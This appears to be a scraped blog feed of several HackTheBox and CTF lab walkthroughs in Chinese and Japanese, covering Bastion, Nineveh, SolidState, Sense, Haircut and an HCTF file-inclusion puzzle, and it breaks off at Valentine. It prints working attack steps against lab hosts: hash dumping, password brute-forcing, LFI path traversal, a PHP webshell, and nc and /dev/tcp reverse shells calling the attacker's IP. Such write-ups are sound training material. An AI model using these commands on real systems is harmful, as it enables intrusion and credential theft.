13:55 CSTNmap scan report for 10.10.10.134Host is up (0.33s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey:| 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)| 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-dsService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s| smb-os-discovery:| OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Bastion| NetBIOS computer name: BASTION\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-04-17T07:57:33+02:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-04-17T05:57:30|_ start_date: 2021-04-17T05:53:40Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 137.36 seconds SMBsmb匿名访问： Backupsbackup里有个note，根据内容大概是整个系统的备份，非常大： note.txt1Sysadmins: please don&#39;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow. mount所以不直接下载，而是挂载后查看： 1234➜ Desktop sudo mount -t cifs //10.10.10.134/backups miao -o user=,password=[sudo] password for miao:➜ Desktop ls miaonote.txt SDT65CB.tmp WindowsImageBackup 查看文件可以看到两个vhd： 1234567891011121314151617181920➜ Desktop find miao -type fmiao/note.txtmiao/SDT65CB.tmpmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhdmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhdmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/BackupSpecs.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xmlmiao/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xmlmiao/WindowsImageBackup/L4mpje-PC/Catalog/BackupGlobalCatalogmiao/WindowsImageBackup/L4mpje-PC/Catalog/GlobalCatalogmiao/WindowsImageBackup/L4mpje-PC/MediaIdmiao/WindowsImageBackup/L4mpje-PC/SPPMetadataCache/&#123;cd113385-65ff-4ea2-8ced-5630f6feca8f&#125; vhd挂载vhd，查看内容, 这一步需要点时间： 1234guestmountapt install libguestfs-toolsguestmount --add miao/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro miao1 secretsdump现在有整个系统备份，就可以去dump hash： 123456789101112131415161718➜ config pwd/home/miao/Desktop/miao1/Windows/System32/config➜ config impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCALImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::[*] Dumping cached domain logon information (domain/username:hash)[*] Dumping LSA Secrets[*] DefaultPassword(Unknown User):bureaulampje[*] DPAPI_SYSTEMdpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd[*] Cleaning up... ##L4mpje 根据hash解出来L4mpje的密码，bureaulampje： user flag之后ssh登录L4mpje，桌面得到user.txt: mRemoteNG简单枚举可以发现mRemoteNG，配置文件里得到密文： 123Administrator : aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt&#x2F;zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&#x3D;&#x3D;L4mpje : yhgmiu5bbuamU3qMUKc&#x2F;uYDdmbMrJZ&#x2F;JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB mRemoteNG-Decrypt https://github.com/haseebT/mRemoteNG-Decrypt 解出来Administrator密码： 12$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt&#x2F;zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&#x3D;&#x3D;Password: thXLHM96BeKL0ER2 root flag之后ssh登录administrator，桌面得到root.txt: 参考资料 https://github.com/haseebT/mRemoteNG-Decrypt https://www.hackthebox.eu/home/machines/writeup/186 HTB: Bastion | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/09/07/htb-bastion.html HackTheBox - Bastion - YouTubehttps://www.youtube.com/watch?v=2j3FNp5pjQ4&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Warmup - HCTF 2018","slug":"Warmup-HCTF-2018","date":"2020-03-03T06:30:44.000Z","updated":"2020-03-03T06:31:52.547Z","comments":true,"path":"2020/03/03/Warmup-HCTF-2018/","link":"","permalink":"https://darkwing.moe/2020/03/03/Warmup-HCTF-2018/","excerpt":"","text":"URLにアクセスする,以下の表示: HTMLソースを表示: 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!--source.php--&gt; &lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;&lt;/body&gt;&lt;/html&gt; コメントより、source.phpがあるようなのでhttp://URL/source.phpへアクセスすると、ソースコードが表示された。 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; hint.phpの内容： 1flag not here, and flag in ffffllllaaaagggg fileパラメータをincludeしてくれるがwhitelistによるチェックがある。また、?より前がwhitelistに合致してもOKとしている。更に、URLデコードしてから?より前がwhitelistに合致してもOKとしている。 つまりは、以下の通り。 hint.php → whitelistにあるためOK miao.php → whitelistに無いためNG hint.php?miao→ ?より前がwhitelistにあるためOK hint.php%3Fmiao → %3FをURLデコードすると?、?より前がwhitelistにあるためOK ただ、このwhitelistを単純に突破しても、includeするファイル名と合致しない。 1http:&#x2F;&#x2F;URL&#x2F;?file&#x3D;hint.php?hint.php よってhint.php?部分をディレクトリ名と見立てて、相対パスで指定してみる。hint.phpのincludeができるかどうかで実験する。 成功。 ffffllllaaaaggggを探す。 http://URL/?file=hint.php?/../ffffllllaaaagggg 同ディレクトリには無い。 ルートを辿る。 flag get: 参考资料这个题目类似这个 CVE-2018-12613 PhpMyadmin后台文件包含分析_PHP_是大方子-CSDN博客https://blog.csdn.net/nzjdsds/article/details/81260335 这篇writeup主要用于对照日文部分专业术语 https://graneed.hatenablog.com/entry/2018/11/11/211721","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"Nineveh - HackTheBox","slug":"Nineveh-HackTheBox","date":"2020-02-27T07:08:59.000Z","updated":"2021-03-17T07:12:03.115Z","comments":true,"path":"2020/02/27/Nineveh-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/27/Nineveh-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/54 10.10.10.43 端口扫描80和443: 123456789101112131415161718192021$ nmap -sC -sV 10.10.10.43Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 13:41 CSTNmap scan report for 10.10.10.43Host is up (0.071s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn't have a title (text/html).| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR| Not valid before: 2017-07-01T15:03:30|_Not valid after: 2018-07-01T15:03:30|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 82.95 seconds 80apache默认页面： 443一张图 目录扫描8080发现个department目录需要登录，info.php就是phpinfp： 123456➜ ~ gobuster dir -u http://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50/index.html (Status: 200)/info.php (Status: 200)/department (Status: 301)/server-status (Status: 403) 443443发现db，secure_notes等目录： 123456gobuster dir -u https://10.10.10.43/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50/index.html (Status: 200)/db (Status: 301)/server-status (Status: 403)/secure_notes (Status: 301) phpLiteAdmindb是phpLiteAdmin v1.9： 可以搜到相关漏洞： PHPLiteAdmin 1.9.3 - Remote PHP Code Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/24044 但前提是需要登录 secure_notessecure_notes里是一张很大的图： 直接查看strings的话能够发现里面藏了很多东西，包括ssh私钥，但当前并没有对外开放ssh端口,可以先保存下来： 密码爆破可以爆破PHPLiteAdmin和department的密码： 12345hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form \"/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password\" -t 64 -V[443][http-post-form] host: 10.10.10.43 login: none password: password123hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \"/department/login.php:username=^USER^&amp;password=^PASS^:Invalid\" -t 64 -V[80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t LFIdepartment那里notes是有lfi，多次尝试发现文件名必须有ninevehNotes.txt才能包含： 1http:&#x2F;&#x2F;10.10.10.43&#x2F;department&#x2F;manage.php?notes&#x3D;files&#x2F;ninevehNotes.txt*&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd webshell我们前面还有个phpLiteAdmin，这个是可以写php文件的，就是数据库表名用php代码，然后重命名数据库, 之后LFI： 12345&lt;?php system($_REQUEST[&quot;miao&quot;]);?&gt;&#x2F;var&#x2F;tmp&#x2F;ninevehNotes.txt.phphttp:&#x2F;&#x2F;10.10.10.43&#x2F;department&#x2F;manage.php?notes&#x3D;&#x2F;var&#x2F;tmp&#x2F;ninevehNotes.txt.php&amp;miao&#x3D;whoami reverse shell1http:&#x2F;&#x2F;10.10.10.43&#x2F;department&#x2F;manage.php?notes&#x3D;&#x2F;var&#x2F;tmp&#x2F;ninevehNotes.txt.php&amp;miao&#x3D;rm%20&#x2F;tmp&#x2F;f;mkfifo%20&#x2F;tmp&#x2F;f;cat%20&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh%20-i%202%3E%261|nc%2010.10.14.3%204444%20%3E&#x2F;tmp&#x2F;f knock查看进程能够发现一个knockd： 搜索资料发现是用于隐藏ssh的，需要敲门才能够ssh： linux安全配置-将ssh服务隐藏于Internet（端口碰撞） - bask! - 博客园https://www.cnblogs.com/bask/p/9159197.html 所以可以直接去查看配置文件，得到敲门序列： 123456789101112131415161718$ cat /etc/knockd.conf[options] logfile = /var/log/knockd.log interface = ens160[openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn[closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn$ ls /homeamrois knock &amp; ssh &amp; user flag1234567sudo apt-get install knockdknock 10.10.10.43 571 290 911# 也可以nmap来进行for x in 571 290 911; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; donechmod 600 nineveh.privssh -i nineveh.priv amrois@10.10.10.43 chkrootkit如果运行pspy之类的可以发现/usr/bin/chkrootkit定时运行，而chkrootkit存在已知的本地提权漏洞： Chkrootkit 0.49 - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/33899 提权 &amp; root flag就是在tmp下写一个update文件，等待触发 12#!&#x2F;bin&#x2F;bashbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;4445 0&gt;&amp;1 参考资料 PHPLiteAdmin 1.9.3 - Remote PHP Code Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/24044 linux安全配置-将ssh服务隐藏于Internet（端口碰撞） - bask! - 博客园https://www.cnblogs.com/bask/p/9159197.html Chkrootkit 0.49 - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/33899 HTB: Nineveh | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/04/22/htb-nineveh.html https://www.hackthebox.eu/home/machines/writeup/54 HackTheBox - Nineveh - YouTubehttps://www.youtube.com/watch?v=K9DKULxSBK4&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"SolidState - HackTheBox","slug":"SolidState-HackTheBox","date":"2020-02-26T06:39:13.000Z","updated":"2021-03-16T06:40:38.087Z","comments":true,"path":"2020/02/26/SolidState-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/26/SolidState-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/85 10.10.10.51 端口扫描需要全端口, 有个非常见端口4555： 1234567891011121314151617181920212223242526272829303132333435➜ ~ sudo masscan -p0-65535 --max-rate 1000 10.10.10.51[sudo] password for miao:Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-03-14 20:35:04 GMTInitiating SYN Stealth ScanScanning 1 hosts [65536 ports/host]Discovered open port 25/tcp on 10.10.10.51Discovered open port 110/tcp on 10.10.10.51Discovered open port 4555/tcp on 10.10.10.51Discovered open port 80/tcp on 10.10.10.51Discovered open port 22/tcp on 10.10.10.51Discovered open port 119/tcp on 10.10.10.51$ nmap -sC -sV -p22,25,80,110,119,4555 10.10.10.51Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 13:22 CSTNmap scan report for 10.10.10.51Host is up (0.067s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey:| 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)| 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)|_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)25/tcp open smtp JAMES smtpd 2.3.2|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.4 [10.10.14.4]),80/tcp open http Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Home - Solid State Security110/tcp open pop3 JAMES pop3d 2.3.2119/tcp open nntp JAMES nntpd (posting ok)4555/tcp open james-admin JAMES Remote Admin 2.3.2Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds JAMESJAMES Remote Admin 2.3.2,很容易搜到默认密码和相关漏洞： Apache James Server 2.3.2 - Remote Command Execution - Linux remote Exploithttps://www.exploit-db.com/exploits/35513 相关漏洞是需要其他用户登录触发的，所以先关注pop3部分 pop3大概就是通过james去修改用户密码，登录pop3，查看邮件： 12345678setpassword james abcdsetpassword thomas abcdsetpassword john abcdsetpassword mindy abcdsetpassword mailadmin abcdquitfor user in james john thomas mindy mailadmin; do ( echo USER $&#123;user&#125;; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC 10.10.10.51 110; done mindy查看mindy用户邮件，他是新员工，邮件里有ssh密码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768$ ncat -nvC 10.10.10.51 110Ncat: Version 7.91 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )Ncat: Connected to 10.10.10.51:110.+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) readyUSER mindy+OKPASS abcd+OK Welcome mindyLIST+OK 2 19451 11092 836.REPR 1-ERRRETR 1+OK Message followsReturn-Path: &lt;mailadmin@localhost&gt;Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;MIME-Version: 1.0Content-Type: text&#x2F;plain; charset&#x3D;us-asciiContent-Transfer-Encoding: 7bitDelivered-To: mindy@localhostReceived: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for &lt;mindy@localhost&gt;; Tue, 22 Aug 2017 13:13:42 -0400 (EDT)Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)From: mailadmin@localhostSubject: WelcomeDear Mindy,Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.We are looking forward to you joining our team and your success at Solid State Security.Respectfully,James.RETR 2+OK Message followsReturn-Path: &lt;mailadmin@localhost&gt;Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;MIME-Version: 1.0Content-Type: text&#x2F;plain; charset&#x3D;us-asciiContent-Transfer-Encoding: 7bitDelivered-To: mindy@localhostReceived: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for &lt;mindy@localhost&gt;; Tue, 22 Aug 2017 13:17:28 -0400 (EDT)Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)From: mailadmin@localhostSubject: Your AccessDear Mindy,Here are your ssh credentials to access the system. Remember to reset your password after your first login.Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.username: mindypass: P@55W0rd1!2@Respectfully,James. user flagmindy用户直接ssh登录，得到user flag，并且注意到当前是rbash，不是常见的bash： James to bash这时候就可以结合前面的james漏洞了,修改payload执行，然后ssh登录触发： 123payload &#x3D; &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.4&#x2F;4444 0&gt;&amp;1&#39;python james_exp.py 10.10.10.51 easy to bash也有简单的方法，登录时候指定bash： 1ssh mindy@10.10.10.51 -t bash 提权信息简单收集下就能发现opt目录下tmp.py文件root会定期执行，用于清理tmp目录，而这个文件是我们可写的： 那就可以直接修改代码等待执行 提权 &amp; root flag有nc，直接加一个反弹shell的，然后等待执行: 参考资料 Apache James Server 2.3.2 - Remote Command Execution - Linux remote Exploithttps://www.exploit-db.com/exploits/35513 HTB: SolidState | 0xdf hacks stuffhttps://0xdf.gitlab.io/2020/04/30/htb-solidstate.html https://www.hackthebox.eu/home/machines/writeup/85 HackTheBox - SolidState - YouTubehttps://www.youtube.com/watch?v=_QapCUx55Xk&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sense - HackTheBox","slug":"Sense-HackTheBox","date":"2020-02-25T06:23:40.000Z","updated":"2021-03-12T06:25:30.184Z","comments":true,"path":"2020/02/25/Sense-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/25/Sense-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/111 10.10.10.60 端口扫描80和443: 123456789101112131415161718$ nmap -sC -sV 10.10.10.60Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 13:46 CSTNmap scan report for 10.10.10.60Host is up (0.071s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http lighttpd 1.4.35|_http-server-header: lighttpd/1.4.35|_http-title: Did not follow redirect to https://10.10.10.60/443/tcp open ssl/http lighttpd 1.4.35|_http-title: Login| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US| Not valid before: 2017-10-14T19:21:35|_Not valid after: 2023-04-06T19:21:35|_ssl-date: TLS randomness does not represent timeService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 89.66 seconds 80/443是pfsense： 目录扫描扫一下目录，重点就两个txt： 123456789101112131415161718192021222324252627282930➜ ~ gobuster dir -k -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100/index.php (Status: 200)/index.html (Status: 200)/help.php (Status: 200)/themes (Status: 301)/stats.php (Status: 200)/css (Status: 301)/edit.php (Status: 200)/includes (Status: 301)/license.php (Status: 200)/system.php (Status: 200)/status.php (Status: 200)/javascript (Status: 301)/changelog.txt (Status: 200)/classes (Status: 301)/exec.php (Status: 200)/widgets (Status: 301)/graph.php (Status: 200)/tree (Status: 301)/wizard.php (Status: 200)/shortcuts (Status: 301)/pkg.php (Status: 200)/installer (Status: 301)/wizards (Status: 301)/xmlrpc.php (Status: 200)/reboot.php (Status: 200)/interfaces.php (Status: 200)/csrf (Status: 301)/system-users.txt (Status: 200) system-users.txt给出用户名，密码就是默认的，搜一下就知道是pfsense： changelog.txtchangelog提示存在未修复漏洞： pfsense使用前面得到的账号密码登录： 1rohit : pfsense 版本2.1.3，直接搜exploit就可以： pfSense &lt; 2.1.4 - ‘status_rrd_graph_img.php’ Command Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/43560 exploitexp一键打： 1python3 exp.py --rhost 10.10.10.60 --lhost 10.10.14.6 --lport 4444 --username rohit --password pfsense flags直接是root权限，读取flags： 参考资料 pfSense &lt; 2.1.4 - ‘status_rrd_graph_img.php’ Command Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/43560 https://www.hackthebox.eu/home/machines/writeup/111 HackTheBox - Sense - YouTubehttps://www.youtube.com/watch?v=d2nVDoVr0jE&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Haircut - HackTheBox","slug":"Haircut-HackTheBox","date":"2020-02-24T07:16:36.000Z","updated":"2021-03-09T07:17:26.377Z","comments":true,"path":"2020/02/24/Haircut-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/24/Haircut-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/21 10.10.10.24 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.10.24Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 13:55 CSTNmap scan report for 10.10.10.24Host is up (0.067s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)| 256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)|_ 256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)80/tcp open http nginx 1.10.0 (Ubuntu)|_http-server-header: nginx/1.10.0 (Ubuntu)|_http-title: HTB HairdresserService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.92 seconds 80就一张图： 目录扫描扫目录可以发现uploads和exposed.php: 1234567gobuster dir -u http://10.10.10.24/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100/index.html (Status: 200)/uploads (Status: 301)/test.html (Status: 200)/hair.html (Status: 200)/exposed.php (Status: 200) exposed.php这个是直接通过curl进行check的： webshell那就可以直接通过curl命令注入添加参数写webshell，前面也看到有uploads目录： 1http:&#x2F;&#x2F;10.10.14.12:7777&#x2F;shell.php -o uploads&#x2F;shell.php user flag1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4444 &gt;/tmp/f shell是www-data用户，但已经可以直接去读maria用户桌面的user.txt了： 提权信息查看suid文件可以发现screen-4.5.0，存在已知漏洞： GNU Screen 4.5.0 - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/41154 提权 &amp;&amp; root flagexp一键： 1234python3 -c 'import pty; pty.spawn(\"/bin/bash\")'wget http://10.10.14.12:7777/exp.shchmod +x exp.sh./exp.sh 参考资料 GNU Screen 4.5.0 - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/41154 HackTheBox - Haircut | p0i5on8https://p0i5on8.github.io/posts/hackthebox-haircut/ https://www.hackthebox.eu/home/machines/writeup/21 HackTheBox - Haircut - YouTubehttps://www.youtube.com/watch?v=9ZXG1qb8lUI&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Valentine - HackTheBox","slug":"Valentine-HackTheBox","date":"2020-02-23T05:06:55.000Z","updated":"2021-02-10T05:08:41.021Z","comments":true,"path":"2020/02/23/Valentine-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/02/23/Valentine-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/127 10.10.10.79 端口扫描22,80,443: 12345678910111213141516171819202122232425$ nmap -sC -sV 10.10.10.79Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-10 11:00 CSTNmap scan report for 10.10.10.79Host is up (0.068s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)| 2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 